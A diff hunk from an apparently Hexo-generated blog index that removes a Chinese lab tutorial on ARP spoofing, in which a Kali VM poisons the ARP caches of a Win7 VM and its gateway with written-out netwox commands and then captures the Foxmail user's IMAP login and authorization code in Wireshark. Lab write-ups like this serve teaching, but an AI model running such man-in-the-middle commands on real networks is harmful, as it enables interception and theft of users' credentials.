@@ -79,31 +79,6 @@
     
     
     <entry>
-      <title>arp欺骗</title>
-      <link href="2021/08/30/arp-qi-pian/"/>
-      <url>2021/08/30/arp-qi-pian/</url>
-      
-        <content type="html"><![CDATA[<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><blockquote><p><strong>Kali充当中间人，捕获用户在Win7上使用Foxmail时收发邮件的数据包，并窃取登录名和授权码</strong></p></blockquote><h4 id="组网"><a href="#组网" class="headerlink" title="组网"></a>组网</h4><blockquote><p>组建局域网（<strong>NAT</strong>模式下）</p></blockquote><ul><li><p><strong>VM_Kali</strong>（充当中间人）</p><blockquote><p><strong>IP</strong>：192.168.140.129</p><p><strong>MAC</strong>：00:0C:29:FB:07:11</p></blockquote></li><li><p><strong>VM_Win7</strong></p><blockquote><p><strong>IP</strong>：192.168.140.144</p><p><strong>MAC</strong>：00:0C:29:D6:6D:1B</p></blockquote></li><li><p><strong>真实机</strong></p><blockquote><p><strong>IP</strong>：192.168.140.1</p><p><strong>MAC</strong>：00:50:56:C0:00:08</p></blockquote></li></ul><h4 id="在Win7上安装foxmail"><a href="#在Win7上安装foxmail" class="headerlink" title="在Win7上安装foxmail"></a>在Win7上安装foxmail</h4><blockquote><p><strong>1.这里我使用163邮箱，根据帮助填写用户名及授权码↓</strong></p></blockquote><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210118213635299.png"></p><blockquote><p><strong>2.然后在账号里面把ssl前面的勾关了，因为要抓明文账号以及密码↓</strong></p></blockquote><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210118214023576.png"></p><h4 id="安装netwox"><a href="#安装netwox" class="headerlink" title="安装netwox"></a>安装netwox</h4><pre class="line-numbers language-none"><code class="language-none">#kali下apt-get install netwox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="伪造身份"><a href="#伪造身份" class="headerlink" title="伪造身份"></a>伪造身份</h4><pre class="line-numbers language-none"><code class="language-none">Step1:# kali伪造成Win7以欺骗网关sudo netwox 33 -d eth0 -a {mac-kali} -b {mac-网关} -e 2 -f {mac-kali} -g {ip-win7} -h {mac-网关}  -i {ip-网关}sudo netwox 33 -d eth0 -a 00:0C:29:FB:07:11 -b 00:50:56:C0:00:08 -e 2 -f 00:0C:29:FB:07:11 -g 192.168.140.144 -h 00:50:56:C0:00:08  -i 192.168.140.1Step2:# kali伪造成网关以欺骗Win7netwox 33 -d eth0 -a {mac-kali} -b {mac-win7}  -e 2 -f {mac-kali}  -g {ip-网关} -h {mac-win7} -i {ip-win7}netwox 33 -d eth0 -a 00:0C:29:FB:07:11 -b 00:0C:29:D6:6D:1B -e 2 -f 00:0C:29:FB:07:11  -g 192.168.140.1 -h 00:0C:29:D6:6D:1B -i 192.168.140.144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210119171736819.png"></p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210119171708680.png"></p><ul><li>这时Kali充当一个中间人</li></ul><h4 id="Wireshark抓取流量"><a href="#Wireshark抓取流量" class="headerlink" title="Wireshark抓取流量"></a>Wireshark抓取流量</h4><blockquote><p>1.在Kali里开始捕获eth0的流量↓</p></blockquote><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210119163926313.png"></p><blockquote><p>2.在foxmail里面点击收取↓</p></blockquote><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210119171642070.png"></p><blockquote><p>3.返回wireshark，只查看imap的包，发现账号和密码↓</p></blockquote><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/image-20210119164816923.png"></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>详见<a href="https://github.com/Ajatars/-">内网渗透开源仓库</a></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 其他 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> arp欺骗 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>buuctf-web-wp</title>
       <link href="2021/07/10/buuctf-web-wp/"/>
       <url>2021/07/10/buuctf-web-wp/</url>
